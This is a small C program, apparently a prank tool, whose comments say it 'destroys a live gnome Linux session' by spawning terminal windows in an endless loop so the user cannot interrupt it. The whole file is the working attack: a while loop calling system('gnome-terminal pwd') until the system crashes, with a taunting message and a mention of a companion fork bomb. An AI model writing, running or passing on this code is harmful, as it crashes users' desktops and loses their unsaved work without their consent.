#include <stdio.h>
#include <stdlib.h>
// filename: real_bullshit.c
// file description: more reliable version of BULLSH1T
// destroys a live gnome Linux session by spam-spawning terminal windows
// That way, the Linux Desktop user can't interrupt by closing terminal window, or by using key escape sequence such as CTRL-C.
// tested only on Linux Mint so far, but this should work on anything where gnome-terminal is enabled.

int main(){

	printf("welcome to the infinite loop, SUCKER!");

	while(420>69){
		system("gnome-terminal pwd");
		// spawns infinite terminal windows until your system crashes
		// for a more silent "what hit me?" crash, check out fork_bomb.c
	}
}
